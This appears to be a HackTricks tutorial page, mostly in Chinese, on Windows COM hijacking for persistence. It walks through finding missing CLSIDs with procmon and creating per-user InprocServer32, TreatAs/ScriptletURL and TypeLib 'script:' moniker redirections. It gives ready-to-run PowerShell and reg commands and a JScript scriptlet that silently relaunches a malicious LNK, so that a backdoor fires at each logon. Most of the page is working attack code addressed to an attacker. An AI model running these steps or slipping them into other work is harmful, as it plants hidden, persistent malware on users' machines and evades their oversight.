# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 搜索不存在的 COM 组件

由于用户可以修改 HKCU 的值，**COM Hijacking** 可被用作一种 **持久化机制**。使用 `procmon` 很容易发现被查询但尚不存在、可由攻击者创建的 COM 注册表项。经典过滤条件：

- **RegOpenKey** 操作。
- where the _Result_ is **NAME NOT FOUND**。
- and the _Path_ ends with **InprocServer32**。

在搜寻时的有用变体：

- 还要查找缺失的 **`LocalServer32`** 键。某些 COM 类是进程外服务器（out-of-process servers），会启动受攻击者控制的 EXE 而不是 DLL。
- 除了 `InprocServer32` 外，还要搜索 **`TreatAs`** 和 **`ScriptletURL`** 注册表操作。最近的检测内容和恶意软件分析不断指出这些项，因为它们比普通 COM 注册少得多，因而信号更强。
- 在将注册项克隆到 HKCU 时，从原始的 `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` 复制合法的 **`ThreadingModel`**。使用错误的模型常常会导致激活失败并使劫持更显眼。
- 在 64 位系统上检查 64 位和 32 位视图（`procmon.exe` vs `procmon64.exe`，`HKLM\Software\Classes` 和 `HKLM\Software\Classes\WOW6432Node`），因为 32 位应用可能会解析到不同的 COM 注册。

一旦你决定要冒充哪个不存在的 COM，就执行以下命令。_如果你决定冒充一个每隔几秒就被加载的 COM，请谨慎——这可能适得其反。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### 可劫持的 Task Scheduler COM 组件

Windows Tasks 使用 Custom Triggers 调用 COM 对象，并且因为它们通过 Task Scheduler 执行，所以更容易预测它们何时会被触发。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

检查输出后，你可以选择一个例如会在**每次用户登录时**执行的任务。

现在在 **HKEY\CLASSES\ROOT\CLSID** 以及 HKLM 和 HKCU 中搜索 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**，通常会发现该值在 HKCU 中不存在。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
然后，你只需创建该 `HKCU` 条目，每次用户登录时，你的后门就会被触发。

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` 允许一个 CLSID 被另一个模拟。从攻击角度来看，这意味着你可以保留原始 CLSID 不变，创建第二个指向 `scrobj.dll` 的每用户 CLSID，然后通过 `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` 将真实的 COM 对象重定向到恶意的那个。

这在以下情况下很有用：

- 目标应用在登录或应用启动时已实例化一个稳定的 CLSID
- 你想要仅通过注册表重定向，而不是替换原始的 `InprocServer32`
- 你想通过 `ScriptletURL` 值执行本地或远程的 `.sct` 脚本

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
注意：

- `scrobj.dll` 读取 `ScriptletURL` 值并执行引用的 `.sct`，因此你可以将 payload 保存在本地文件或通过 HTTP/HTTPS 远程拉取。
- `TreatAs` 在原始 COM 注册已在 HKLM 完整且稳定时尤其有用，因为你只需要一个小的 per-user redirect，而不必镜像整个树。
- 若要在不等待自然触发的情况下进行验证，如果目标类支持 STA activation，可以使用 `rundll32.exe -sta <ProgID-or-CLSID>` 手动实例化伪 ProgID/CLSID。

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) 定义 COM 接口，并通过 `LoadTypeLib()` 加载。当 COM server 被实例化时，操作系统也可能通过查阅 `HKCR\TypeLib\{LIBID}` 下的注册表键来加载关联的 TypeLib。如果将 TypeLib 路径替换为一个 **moniker**，例如 `script:C:\...\evil.sct`，Windows 在解析该 TypeLib 时会执行该 scriptlet —— 从而在常用组件被访问时触发一种隐蔽的持久化。

这已在 Microsoft Web Browser control 上被观察到（该控件经常被 Internet Explorer、嵌入 WebBrowser 的应用程序，甚至 `explorer.exe` 加载）。

### 步骤 (PowerShell)

1) 确定由高频 CLSID 使用的 TypeLib (LIBID)。常被恶意软件链滥用的示例 CLSID：`{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)。
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) 将每个用户的 TypeLib 路径指向一个本地 scriptlet，使用 `script:` moniker（不需要管理员权限）：
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop 一个最小的 JScript `.sct`，用来重新启动你的主要 payload（例如 initial chain 使用的 `.lnk`）：
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) 触发 – 打开 IE、嵌入 WebBrowser control 的应用程序，或甚至常规的 Explorer 活动都会加载 TypeLib 并执行 scriptlet，从而在登录/重启时重新激活你的链。

清理
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
说明
- 你可以将相同逻辑应用到其他高频 COM 组件；始终先从 `HKCR\CLSID\{CLSID}\TypeLib` 解析真实的 `LIBID`。
- 在 64 位系统上，你也可以为 64 位的使用者填充 `win64` 子键。

## 参考

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
